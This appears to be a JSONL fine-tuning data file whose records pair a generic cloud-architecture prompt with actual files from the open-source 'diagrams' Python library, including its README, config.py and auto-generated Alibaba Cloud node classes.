provider](https://img.shields.io/badge/Generic-orange?color=5f87bf)\n![programming provider](https://img.shields.io/badge/Programming-orange?color=5f87bf)\n![saas provider](https://img.shields.io/badge/SaaS-orange?color=5f87bf)\n![c4 provider](https://img.shields.io/badge/C4-orange?color=5f87bf)\n\n## Getting Started\n\nIt requires **Python 3.9** or higher, check your Python version first.\n\nIt uses [Graphviz](https://www.graphviz.org/) to render the diagram, so you need to [install Graphviz](https://graphviz.gitlab.io/download/) to use **diagrams**. After installing graphviz (or already have it), install the **diagrams**.\n\n> macOS users can download the Graphviz via `brew install graphviz` if you're using [Homebrew](https://brew.sh).\n\n```shell\n# using pip (pip3)\n$ pip install diagrams\n\n# using pipenv\n$ pipenv install diagrams\n\n# using poetry\n$ poetry add diagrams\n```\n\nYou can start with [quick start](https://diagrams.mingrammer.com/docs/getting-started/installation#quick-start). Check out [guides](https://diagrams.mingrammer.com/docs/guides/diagram) for more details, and you can find all available nodes list in [here](https://diagrams.mingrammer.com/docs/nodes/aws).\n\n## Examples\n\n| Event Processing                                             | Stateful Architecture                                        | Advanced Web Service                                         |\n| ------------------------------------------------------------ | ------------------------------------------------------------ | ------------------------------------------------------------ |\n| ![event processing](https://diagrams.mingrammer.com/img/event_processing_diagram.png) | ![stateful architecture](https://diagrams.mingrammer.com/img/stateful_architecture_diagram.png) | ![advanced web service with on-premises](https://diagrams.mingrammer.com/img/advanced_web_service_with_on-premises.png) |\n\nYou can find all the examples on the [examples](https://diagrams.mingrammer.com/docs/getting-started/examples) page.\n\n## Contributing\n\nTo contribute to diagram, check out [contribution guidelines](CONTRIBUTING.md).\n\n> Let me know if you are using diagrams! I'll add you in showcase page. (I'm working on it!) :)\n\n## Who uses it?\n\n[Apache Airflow](https://github.com/apache/airflow) is the most popular data workflow Orchestrator. Airflow uses Diagrams to generate architecture diagrams in their documentation.\n\n[Cloudiscovery](https://github.com/Cloud-Architects/cloudiscovery) helps you to analyze resources in your cloud (AWS/GCP/Azure/Alibaba/IBM) account. It allows you to create a diagram of analyzed cloud resource map based on this Diagrams library, so you can draw your existing cloud infrastructure with Cloudiscovery.\n\n[Airflow Diagrams](https://github.com/feluelle/airflow-diagrams) is an Airflow plugin that aims to easily visualise your Airflow DAGs on service level from providers like AWS, GCP, Azure, etc. via diagrams.\n\n[KubeDiagrams](https://github.com/philippemerle/KubeDiagrams) is a tool to generate Kubernetes architecture diagrams from Kubernetes manifest files, kustomization files, Helm charts, and actual cluster state. [KubeDiagrams](https://github.com/philippemerle/KubeDiagrams) supports all Kubernetes built-in resources, any custom resources, and label-based resource clustering.\n\n## Other languages\n\n- If you are familiar with Go, you can use [go-diagrams](https://github.com/blushft/go-diagrams) as well.\n\n## License\n\n[MIT](LICENSE)\n", "metadata": {"source": "github.com/mingrammer/diagrams", "file_path": "README.md", "language": "markdown", "complexity": "simple", "star_count": 41221, "quality_score": 0.8300000000000001, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": true, "has_scaling": true, "has_cloud_patterns": true, "has_containers": true, "has_diagrams": true, "line_count": 94}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "cloud_architecture", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design cloud-native architecture with serverless and container patterns with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# fmt: off\n\n#########################\n#      Application      #\n#########################\n\nAPP_NAME = \"diagrams\"\n\nDIR_DOC_ROOT = \"docs/nodes\"\nDIR_APP_ROOT = \"diagrams\"\nDIR_RESOURCE = \"resources\"\nDIR_TEMPLATE = \"templates\"\n\nPROVIDERS = (\n    \"base\",\n    \"onprem\",\n    \"aws\",\n    \"azure\",\n    \"digitalocean\",\n    \"gcp\",\n    \"ibm\",\n    \"firebase\",\n    \"k8s\",\n    \"alibabacloud\",\n    \"oci\",\n    \"programming\",\n    \"saas\",\n    \"elastic\",\n    \"generic\",\n    \"openstack\",\n    \"outscale\",\n    \"gis\"\n)\n\n#########################\n#  Resource Processing  #\n#########################\n\nCMD_ROUND = \"round\"\nCMD_ROUND_OPTS = (\"-w\",)\nCMD_SVG2PNG = \"inkscape\"\nCMD_SVG2PNG_OPTS = (\"-w\", \"256\", \"-h\", \"256\", \"--export-type\", \"png\")\nCMD_SVG2PNG_IM = \"convert\"\nCMD_SVG2PNG_IM_OPTS = (\"-shave\", \"25%x25%\", \"-resize\", \"256x256!\")\n\nFILE_PREFIXES = {\n    \"onprem\": (),\n    \"aws\": (\"Amazon-\", \"AWS-\"),\n    \"azure\": (\"Azure-\",),\n    \"digitalocean\": (),\n    \"gcp\": (\"Cloud-\",),\n    \"firebase\": (\"Cloud-\",),\n    \"ibm\": (),\n    \"k8s\": (),\n    \"alibabacloud\": (),\n    \"oci\": (\"OCI-icon-\",),\n    \"programming\": (),\n    \"saas\": (),\n    \"elastic\": (),\n    \"outscale\": (),\n    \"generic\": (),\n    \"openstack\": (),\n    \"gis\": (),\n}\n\n#########################\n#  Doc Auto Generation  #\n#########################\n\nTMPL_APIDOC = \"apidoc.tmpl\"\n\n#########################\n# Class Auto Generation #\n#########################\n\nTMPL_MODULE = \"module.tmpl\"\n\nUPPER_WORDS = {\n    \"aws\": (\"aws\", \"api\", \"ebs\", \"ec2\", \"efs\", \"emr\", \"rds\", \"ml\", \"mq\", \"nat\", \"vpc\", \"waf\", \"sdk\"),\n    \"azure\": (\"ad\", \"b2c\", \"ai\", \"api\", \"cdn\", \"ddos\", \"dns\", \"fxt\", \"hana\", \"hd\", \"id\", \"sap\", \"sql\", \"vm\", \"vpn\", \"vpc\"),\n    \"gcp\": (\"gcp\", \"ai\", \"api\", \"cdn\", \"dns\", \"gke\", \"gpu\", \"iap\", \"ml\", \"nat\", \"os\", \"sdk\", \"sql\", \"tpu\", \"vpn\"),\n    \"firebase\": (\"ab\", \"fcm\", \"ml\"),\n    \"k8s\": (\n        \"api\", \"cm\", \"ccm\", \"crb\", \"crd\", \"ds\", \"etcd\", \"hpa\", \"k8s\", \"ns\", \"psp\", \"pv\", \"pvc\", \"rb\", \"rs\",\n        \"sa\", \"sc\", \"sts\", \"svc\",\n    ),\n    \"oci\": (\"oci\", \"ocid\", \"oke\", \"ocir\", \"ddos\", \"waf\", \"bm\", \"vm\", \"cdn\", \"vpn\", \"dns\", \"nat\", \"dms\", \"api\", \"id\"),\n    \"elastic\": (\"apm\", \"siem\", \"ece\", \"eck\", \"sql\"),\n    \"generic\": (\"vpn\", \"ios\", \"xen\", \"sql\", \"lxc\"),\n    \"outscale\": (\"osc\",),\n    \"openstack\": (\"rpm\", \"loci\", \"nfv\", \"ec2api\"),\n    \"pve\": (\"pve\",),\n    \"ibm\": (\"ibm\",),\n    \"gis\": (\"gis\",\"ban\",\"ign\",\"ogc\",\"qgis\",\"wfs\",\"wms\"),\n}\n\nTITLE_WORDS = {\n    \"onprem\": {\n        \"onprem\": \"OnPrem\",\n    },\n    \"alibabacloud\": {\n        \"alibabacloud\": \"AlibabaCloud\"\n    },\n    \"aws\": {\n        \"cloudfront\": \"CloudFront\"\n    },\n    \"digitalocean\": {\n        \"digitalocean\": \"DigitalOcean\"\n    },\n    \"openstack\": {\n        \"openstack\": \"OpenStack\"\n    },\n    \"ibm\": {\n        \"ibm\": \"IBMCloud\"\n    },\n}\n\n# TODO: check if the classname exists\nALIASES = {\n    \"onprem\": {\n        \"analytics\": {\n            \"Powerbi\": \"PowerBI\"\n        },\n        \"ci\": {\n            \"Circleci\": \"CircleCI\",\n            \"Concourseci\": \"ConcourseCI\",\n            \"Droneci\": \"DroneCI\",\n            \"Gitlabci\": \"GitlabCI\",\n            \"Travisci\": \"TravisCI\",\n            \"Teamcity\": \"TC\",\n            \"Zuulci\": \"ZuulCI\",\n        },\n        \"container\": {\n            \"Lxc\": \"LXC\",\n            \"Rkt\": \"RKT\",\n        },\n        \"database\": {\n            \"Clickhouse\": \"ClickHouse\",\n            \"Cockroachdb\": \"CockroachDB\",\n            \"Couchdb\": \"CouchDB\",\n            \"Hbase\": \"HBase\",\n            \"Influxdb\": \"InfluxDB\",\n            \"Janusgraph\": \"JanusGraph\",\n            \"Mariadb\": \"MariaDB\",\n            \"Mongodb\": \"MongoDB\",\n            \"Mssql\": \"MSSQL\",\n            \"Mysql\": \"MySQL\",\n            \"Postgresql\": \"PostgreSQL\",\n            \"Qdrant\": \"Qdrant\",\n        },\n        \"gitops\": {\n            \"Argocd\": \"ArgoCD\",\n        },\n        \"logging\": {\n            \"Fluentbit\": \"FluentBit\",\n            \"Rsyslog\": \"RSyslog\",\n        },\n        \"network\": {\n            \"Etcd\": \"ETCD\",\n            \"Haproxy\": \"HAProxy\",\n            \"OpenServiceMesh\": \"OSM\",\n            \"Opnsense\": \"OPNSense\",\n            \"Pfsense\": \"PFSense\",\n            \"Vyos\": \"VyOS\"\n        },\n        \"proxmox\": {\n            \"Pve\": \"ProxmoxVE\",\n        },\n        \"queue\": {\n            \"Activemq\": \"ActiveMQ\",\n            \"Emqx\": \"EMQX\",\n            \"Rabbitmq\": \"RabbitMQ\",\n            \"Zeromq\": \"ZeroMQ\",\n        },\n        \"storage\": {\n            \"Ceph\": \"CEPH\",\n            \"CephOsd\": \"CEPH_OSD\",\n        },\n        \"workflow\": {\n            \"Kubeflow\": \"KubeFlow\",\n            \"Nifi\": \"NiFi\",\n        }\n    },\n    \"aws\": {\n        \"analytics\": {\n            \"ElasticsearchService\": \"ES\",\n        },\n        \"business\": {\n            \"AlexaForBusiness\": \"A4B\"\n        },\n        \"blockchain\": {\n            \"QuantumLedgerDatabaseQldb\": \"QLDB\"\n        },\n        \"compute\": {\n            \"ApplicationAutoScaling\": \"AutoScaling\",\n            \"EC2Ami\": \"AMI\",\n            \"EC2ContainerRegistry\": \"ECR\",\n            \"ElasticBeanstalk\": \"EB\",\n            \"ElasticContainerService\": \"ECS\",\n            \"ElasticKubernetesService\": \"EKS\",\n            \"ServerlessApplicationRepository\": \"SAR\",\n        },\n        \"database\": {\n            \"DatabaseMigrationService\": \"DMS\",\n            \"DocumentdbMongodbCompatibility\": \"DocumentDB\",\n            \"DynamodbDax\": \"DAX\",\n            \"DynamodbGlobalSecondaryIndex\": \"DynamodbGSI\",\n            \"Database\": \"DB\",\n            \"Dynamodb\": \"DDB\",\n            \"Elasticache\": \"ElastiCache\",\n            \"QuantumLedgerDatabaseQldb\": \"QLDB\",\n        },\n        \"devtools\": {\n            \"CommandLineInterface\": \"CLI\",\n            \"DeveloperTools\": \"DevTools\",\n        },\n        \"engagement\": {\n            \"SimpleEmailServiceSes\": \"SES\",\n        },\n        \"general\": {\n            \"GenericOfficeBuilding\": \"OfficeBuilding\",\n        },\n        \"integration\": {\n            \"SimpleNotificationServiceSns\": \"SNS\",\n            \"SimpleQueueServiceSqs\": \"SQS\",\n            \"StepFunctions\": \"SF\",\n        },\n        \"iot\": {\n            \"Freertos\": \"FreeRTOS\",\n            \"IotHardwareBoard\": \"IotBoard\",\n        },\n        \"management\": {\n            \"SystemsManager\": \"SSM\",\n            \"SystemsManagerParameterStore\": \"ParameterStore\",\n        },\n        \"migration\": {\n            \"ApplicationDiscoveryService\": \"ADS\",\n            \"CloudendureMigration\": \"CEM\",\n            \"DatabaseMigrationService\": \"DMS\",\n            \"MigrationAndTransfer\": \"MAT\",\n            \"ServerMigrationService\": \"SMS\",\n        },\n        \"ml\": {\n            \"DeepLearningContainers\": \"DLC\",\n        },\n        \"network\": {\n            \"CloudFront\": \"CF\",\n            \"ElasticLoadBalancing\": \"ELB\",\n            \"ElbApplicationLoadBalancer\": \"ALB\",\n            \"ElbClassicLoadBalancer\": \"CLB\",\n            \"ElbNetworkLoadBalancer\": \"NLB\",\n            \"GlobalAccelerator\": \"GAX\",\n            \"InternetGateway\": \"IGW\",\n            \"TransitGateway\": \"TGW\",\n            \"TransitGatewayAttachment\": \"TGWAttach\",\n        },\n        \"security\": {\n            \"CertificateManager\": \"ACM\",\n            \"Cloudhsm\": \"CloudHSM\",\n            \"DirectoryService\": \"DS\",\n            \"FirewallManager\": \"FMS\",\n            \"IdentityAndAccessManagementIamAccessAnalyzer\": \"IAMAccessAnalyzer\",\n            \"IdentityAndAccessManagementIamAWSSts\": \"IAMAWSSts\",\n            \"IdentityAndAccessManagementIamPermissions\": \"IAMPermissions\",\n            \"IdentityAndAccessManagementIamRole\": \"IAMRole\",\n            \"IdentityAndAccessManagementIam\": \"IAM\",\n            \"KeyManagementService\": \"KMS\",\n            \"ResourceAccessManager\": \"RAM\",\n        },\n        \"storage\": {\n            \"CloudendureDisasterRecovery\": \"CDR\",\n            \"ElasticBlockStoreEBS\": \"EBS\",\n            \"ElasticFileSystemEFS\": \"EFS\",\n            \"Fsx\": \"FSx\",\n            \"SimpleStorageServiceS3\": \"S3\",\n        },\n    },\n    \"azure\": {\n        \"compute\": {\n            \"ContainerRegistries\": \"ACR\",\n            \"KubernetesServices\": \"AKS\",\n            \"VMScaleSet\": \"VMSS\"\n        },\n    },\n    \"gcp\": {\n        \"analytics\": {\n            \"Bigquery\": \"BigQuery\",\n            \"Pubsub\": \"PubSub\",\n        },\n        \"compute\": {\n            \"AppEngine\": \"GAE\",\n            \"Functions\": \"GCF\",\n            \"ComputeEngine\": \"GCE\",\n            \"KubernetesEngine\": \"GKE\",\n        },\n        \"database\": {\n            \"Bigtable\": \"BigTable\",\n        },\n        \"devtools\": {\n            \"ContainerRegistry\": \"GCR\",\n        },\n        \"ml\": {\n            \"Automl\": \"AutoML\",\n            \"NaturalLanguageAPI\": \"NLAPI\",\n            \"SpeechToText\": \"STT\",\n            \"TextToSpeech\": \"TTS\",\n        },\n        \"network\": {\n            \"VirtualPrivateCloud\": \"VPC\"\n        },\n        \"security\": {\n            \"KeyManagementService\": \"KMS\",\n            \"SecurityCommandCenter\": \"SCC\",\n        },\n        \"storage\": {\n            \"Storage\": \"GCS\",\n        },\n    },\n    \"firebase\": {\n        \"grow\": {\n            \"Messaging\": \"FCM\"\n        }\n    },\n    \"k8s\": {\n        \"clusterconfig\": {\n            \"Limits\": \"LimitRange\",\n            \"HPA\": \"HorizontalPodAutoscaler\",\n        },\n        \"compute\": {\n            \"Deploy\": \"Deployment\",\n            \"DS\": \"DaemonSet\",\n            \"RS\": \"ReplicaSet\",\n            \"STS\": \"StatefulSet\"\n        },\n        \"controlplane\": {\n            \"API\": \"APIServer\",\n            \"CM\": \"ControllerManager\",\n            \"KProxy\": \"KubeProxy\",\n            \"Sched\": \"Scheduler\",\n        },\n        \"group\": {\n            \"NS\": \"Namespace\",\n        },\n        \"network\": {\n            \"Ep\": \"Endpoint\",\n            \"Ing\": \"Ingress\",\n            \"Netpol\": \"NetworkPolicy\",\n            \"SVC\": \"Service\",\n        },\n        \"podconfig\": {\n            \"CM\": \"ConfigMap\",\n        },\n        \"rbac\": {\n            \"CRole\": \"ClusterRole\",\n            \"CRB\": \"ClusterRoleBinding\",\n            \"RB\": \"RoleBinding\",\n            \"SA\": \"ServiceAccount\",\n        },\n        \"storage\": {\n            \"PV\": \"PersistentVolume\",\n            \"PVC\": \"PersistentVolumeClaim\",\n            \"SC\": \"StorageClass\",\n            \"Vol\": \"Volume\",\n        },\n    },\n    \"alibabacloud\": {\n        \"application\": {\n            \"LogService\": \"SLS\",\n            \"MessageNotificationService\": \"MNS\",\n            \"PerformanceTestingService\": \"PTS\",\n            \"SmartConversationAnalysis\": \"SCA\",\n        },\n        \"compute\": {\n            \"AutoScaling\": \"ESS\",\n            \"ElasticComputeService\": \"ECS\",\n            \"ElasticContainerInstance\": \"ECI\",\n            \"ElasticHighPerformanceComputing\": \"EHPC\",\n            \"FunctionCompute\": \"FC\",\n            \"OperationOrchestrationService\": \"OOS\",\n            \"ResourceOrchestrationService\": \"ROS\",\n            \"ServerLoadBalancer\": \"SLB\",\n            \"ServerlessAppEngine\": \"SAE\",\n            \"SimpleApplicationServer\": \"SAS\",\n            \"WebAppService\": \"WAS\",\n        },\n        \"database\": {\n            \"DataManagementService\": \"DMS\",\n            \"DataTransmissionService\": \"DTS\",\n            \"DatabaseBackupService\": \"DBS\",\n            \"DisributeRelationalDatabaseService\": \"DRDS\",\n            \"GraphDatabaseService\": \"GDS\",\n            \"RelationalDatabaseService\": \"RDS\",\n        },\n        \"network\": {\n            \"CloudEnterpriseNetwork\": \"CEN\",\n            \"ElasticIpAddress\": \"EIP\",\n            \"ServerLoadBalancer\": \"SLB\",\n            \"VirtualPrivateCloud\": \"VPC\",\n        },\n        \"security\": {\n            \"AntiBotService\": \"ABS\",\n            \"AntifraudService\": \"AS\",\n            \"CloudFirewall\": \"CFW\",\n            \"ContentModeration\": \"CM\",\n            \"DataEncryptionService\": \"DES\",\n            \"WebApplicationFirewall\": \"WAF\",\n        },\n        \"storage\": {\n            \"FileStorageHdfs\": \"HDFS\",\n            \"FileStorageNas\": \"NAS\",\n            \"HybridBackupRecovery\": \"HBR\",\n            \"HybridCloudDisasterRecovery\": \"HDR\",\n            \"ObjectStorageService\": \"OSS\",\n            \"ObjectTableStore\": \"OTS\",\n        }\n    },\n    \"digitalocean\": {},\n    \"gis\": {},\n    \"oci\": {\n        \"compute\": {\n            \"VM\": \"VirtualMachine\",\n            \"VMWhite\": \"VirtualMachineWhite\",\n            \"BM\": \"BareMetal\",\n            \"BMWhite\": \"BareMetalWhite\",\n            \"OCIR\": \"OCIRegistry\",\n            \"OCIRWhite\": \"OCIRegistryWhite\",\n            \"OKE\": \"ContainerEngine\",\n            \"OKEWhite\": \"ContainerEngineWhite\",\n        },\n        \"database\": {\n            \"Autonomous\": \"ADB\",\n            \"AutonomousWhite\": \"ADBWhite\",\n            \"DatabaseService\": \"DBService\",\n            \"DatabaseServiceWhite\": \"DBServiceWhite\",\n        }\n    },\n    \"programming\": {\n        \"framework\": {\n            \"Fastapi\": \"FastAPI\",\n            \"Graphql\": \"GraphQL\",\n            \"Dotnet\": \"DotNet\",\n            \"Nextjs\": \"NextJs\"\n        },\n        \"language\": {\n            \"Javascript\": \"JavaScript\",\n            \"Nodejs\": \"NodeJS\",\n            \"Php\": \"PHP\",\n            \"Typescript\": \"TypeScript\"\n        },\n    },\n    \"saas\": {\n        \"logging\": {\n            \"Datadog\": \"DataDog\",\n            \"Newrelic\": \"NewRelic\"\n        }\n    },\n    \"elastic\": {\n        \"elasticsearch\": {\n            \"Elasticsearch\": \"ElasticSearch\",\n            \"Logstash\": \"LogStash\",\n            \"MachineLearning\": \"ML\",\n        }\n    },\n    \"outscale\": {\n        \"Osc\": \"OSC\",\n    },\n    \"ibm\": {},\n    \"generic\": {},\n    \"openstack\": {\n        \"user\": {\n            \"Openstackclient\": \"OpenStackClient\",\n        },\n        \"billing\": {\n            \"Cloudkitty\": \"CloudKitty\",\n        },\n        \"deployment\": {\n            \"Kolla\": \"KollaAnsible\",\n            \"Tripleo\": \"TripleO\",\n        }\n    },\n}\n", "metadata": {"source": "github.com/mingrammer/diagrams", "file_path": "config.py", "language": "python", "complexity": "complex", "star_count": 41221, "quality_score": 0.8600000000000001, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": true, "has_caching": true, "has_database_design": true, "has_security": true, "has_monitoring": true, "has_scaling": true, "has_cloud_patterns": true, "has_containers": true, "has_diagrams": true, "line_count": 482}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "cloud_architecture", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design cloud-native architecture with serverless and container patterns for cloud infrastructure\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "\"\"\"\nAlibabaCloud provides a set of services for Alibaba Cloud provider.\n\"\"\"\n\nfrom diagrams import Node\n\n\nclass _AlibabaCloud(Node):\n    _provider = \"alibabacloud\"\n    _icon_dir = \"resources/alibabacloud\"\n\n    fontcolor = \"#ffffff\"\n\n\nclass AlibabaCloud(_AlibabaCloud):\n    _icon = \"alibabacloud.png\"\n", "metadata": {"source": "github.com/mingrammer/diagrams", "file_path": "diagrams/alibabacloud/__init__.py", "language": "python", "complexity": "simple", "star_count": 41221, "quality_score": 0.92, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": true, "has_containers": false, "has_diagrams": true, "line_count": 17}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "cloud_architecture", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design cloud-native architecture with serverless and container patterns for cloud infrastructure\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# This module is automatically generated by autogen.sh. DO NOT EDIT.\n\nfrom . import _AlibabaCloud\n\n\nclass _Analytics(_AlibabaCloud):\n    _type = \"analytics\"\n    _icon_dir = \"resources/alibabacloud/analytics\"\n\n\nclass AnalyticDb(_Analytics):\n    _icon = \"analytic-db.png\"\n\n\nclass ClickHouse(_Analytics):\n    _icon = \"click-house.png\"\n\n\nclass DataLakeAnalytics(_Analytics):\n    _icon = \"data-lake-analytics.png\"\n\n\nclass ElaticMapReduce(_Analytics):\n    _icon = \"elatic-map-reduce.png\"\n\n\nclass OpenSearch(_Analytics):\n    _icon = \"open-search.png\"\n\n\n# Aliases\n", "metadata": {"source": "github.com/mingrammer/diagrams", "file_path": "diagrams/alibabacloud/analytics.py", "language": "python", "complexity": "simple", "star_count": 41221, "quality_score": 0.89, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": true, "has_containers": false, "has_diagrams": false, "line_count": 32}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "cloud_architecture", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design cloud-native architecture with serverless and container patterns for cloud infrastructure\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# This module is automatically generated by autogen.sh. DO NOT EDIT.\n\nfrom . import _AlibabaCloud\n\n\nclass _Application(_AlibabaCloud):\n    _type = \"application\"\n    _icon_dir = \"resources/alibabacloud/application\"\n\n\nclass ApiGateway(_Application):\n    _icon = \"api-gateway.png\"\n\n\nclass BeeBot(_Application):\n    _icon = \"bee-bot.png\"\n\n\nclass BlockchainAsAService(_Application):\n    _icon = \"blockchain-as-a-service.png\"\n\n\nclass CloudCallCenter(_Application):\n    _icon = \"cloud-call-center.png\"\n\n\nclass CodePipeline(_Application):\n    _icon = \"code-pipeline.png\"\n\n\nclass DirectMail(_Application):\n    _icon = \"direct-mail.png\"\n\n\nclass LogService(_Application):\n    _icon = \"log-service.png\"\n\n\nclass MessageNotificationService(_Application):\n    _icon = \"message-notification-service.png\"\n\n\nclass NodeJsPerformancePlatform(_Application):\n    _icon = \"node-js-performance-platform.png\"\n\n\nclass OpenSearch(_Application):\n    _icon = \"open-search.png\"\n\n\nclass PerformanceTestingService(_Application):\n    _icon = \"performance-testing-service.png\"\n\n\nclass RdCloud(_Application):\n    _icon = \"rd-cloud.png\"\n\n\nclass SmartConversationAnalysis(_Application):\n    _icon = \"smart-conversation-analysis.png\"\n\n\nclass Yida(_Application):\n    _icon = \"yida.png\"\n\n\n# Aliases\n\nSLS = LogService\nMNS = MessageNotificationService\nPTS = PerformanceTestingService\nSCA = SmartConversationAnalysis\n", "metadata": {"source": "github.com/mingrammer/diagrams", "file_path": "diagrams/alibabacloud/application.py", "language": "python", "complexity": "simple", "star_count": 41221, "quality_score": 0.89, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": true, "has_containers": false, "has_diagrams": false, "line_count": 73}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "cloud_architecture", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design cloud-native architecture with serverless and container patterns for cloud infrastructure\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# This module is automatically generated by autogen.sh. DO NOT EDIT.\n\nfrom . import _AlibabaCloud\n\n\nclass _Communication(_AlibabaCloud):\n    _type = \"communication\"\n    _icon_dir = \"resources/alibabacloud/communication\"\n\n\nclass DirectMail(_Communication):\n    _icon = \"direct-mail.png\"\n\n\nclass MobilePush(_Communication):\n    _icon = \"mobile-push.png\"\n\n\n# Aliases\n", "metadata": {"source": "github.com/mingrammer/diagrams", "file_path": "diagrams/alibabacloud/communication.py", "language": "python", "complexity": "simple", "star_count": 41221, "quality_score": 0.89, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": true, "has_containers": false, "has_diagrams": false, "line_count": 20}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "cloud_architecture", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design cloud-native architecture with serverless and container patterns for cloud infrastructure\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# This module is automatically generated by autogen.sh. DO NOT EDIT.\n\nfrom . import _AlibabaCloud\n\n\nclass _Compute(_AlibabaCloud):\n    _type = \"compute\"\n    _icon_dir = \"resources/alibabacloud/compute\"\n\n\nclass AutoScaling(_Compute):\n    _icon = \"auto-scaling.png\"\n\n\nclass BatchCompute(_Compute):\n    _icon = \"batch-compute.png\"\n\n\nclass ContainerRegistry(_Compute):\n    _icon = \"container-registry.png\"\n\n\nclass ContainerService(_Compute):\n    _icon = \"container-service.png\"\n\n\nclass ElasticComputeService(_Compute):\n    _icon = \"elastic-compute-service.png\"\n\n\nclass ElasticContainerInstance(_Compute):\n    _icon = \"elastic-container-instance.png\"\n\n\nclass ElasticHighPerformanceComputing(_Compute):\n    _icon = \"elastic-high-performance-computing.png\"\n\n\nclass ElasticSearch(_Compute):\n    _icon = \"elastic-search.png\"\n\n\nclass FunctionCompute(_Compute):\n    _icon = \"function-compute.png\"\n\n\nclass OperationOrchestrationService(_Compute):\n    _icon = \"operation-orchestration-service.png\"\n\n\nclass ResourceOrchestrationService(_Compute):\n    _icon = \"resource-orchestration-service.png\"\n\n\nclass ServerLoadBalancer(_Compute):\n    _icon = \"server-load-balancer.png\"\n\n\nclass ServerlessAppEngine(_Compute):\n    _icon = \"serverless-app-engine.png\"\n\n\nclass SimpleApplicationServer(_Compute):\n    _icon = \"simple-application-server.png\"\n\n\nclass WebAppService(_Compute):\n    _icon = \"web-app-service.png\"\n\n\n# Aliases\n\nESS = AutoScaling\nECS = ElasticComputeService\nECI = ElasticContainerInstance\nEHPC = ElasticHighPerformanceComputing\nFC = FunctionCompute\nOOS = OperationOrchestrationService\nROS = ResourceOrchestrationService\nSLB = ServerLoadBalancer\nSAE = ServerlessAppEngine\nSAS = SimpleApplicationServer\nWAS = WebAppService\n", "metadata": {"source": "github.com/mingrammer/diagrams", "file_path": "diagrams/alibabacloud/compute.py", "language": "python", "complexity": "medium", "star_count": 41221, "quality_score": 0.89, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": true, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": true, "has_containers": true, "has_diagrams": false, "line_count": 84}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "cloud_architecture", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design cloud-native architecture with serverless and container patterns for cloud infrastructure\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# This module is automatically generated by autogen.sh. DO NOT EDIT.\n\nfrom . import _AlibabaCloud\n\n\nclass _Database(_AlibabaCloud):\n    _type = \"database\"\n    _icon_dir = \"resources/alibabacloud/database\"\n\n\nclass ApsaradbCassandra(_Database):\n    _icon = \"apsaradb-cassandra.png\"\n\n\nclass ApsaradbHbase(_Database):\n    _icon = \"apsaradb-hbase.png\"\n\n\nclass ApsaradbMemcache(_Database):\n    _icon = \"apsaradb-memcache.png\"\n\n\nclass ApsaradbMongodb(_Database):\n    _icon = \"apsaradb-mongodb.png\"\n\n\nclass ApsaradbOceanbase(_Database):\n    _icon = \"apsaradb-oceanbase.png\"\n\n\nclass ApsaradbPolardb(_Database):\n    _icon = \"apsaradb-polardb.png\"\n\n\nclass ApsaradbPostgresql(_Database):\n    _icon = \"apsaradb-postgresql.png\"\n\n\nclass ApsaradbPpas(_Database):\n    _icon = \"apsaradb-ppas.png\"\n\n\nclass ApsaradbRedis(_Database):\n    _icon = \"apsaradb-redis.png\"\n\n\nclass ApsaradbSqlserver(_Database):\n    _icon = \"apsaradb-sqlserver.png\"\n\n\nclass DataManagementService(_Database):\n    _icon = \"data-management-service.png\"\n\n\nclass DataTransmissionService(_Database):\n    _icon = \"data-transmission-service.png\"\n\n\nclass DatabaseBackupService(_Database):\n    _icon = \"database-backup-service.png\"\n\n\nclass DisributeRelationalDatabaseService(_Database):\n    _icon = \"disribute-relational-database-service.png\"\n\n\nclass GraphDatabaseService(_Database):\n    _icon = 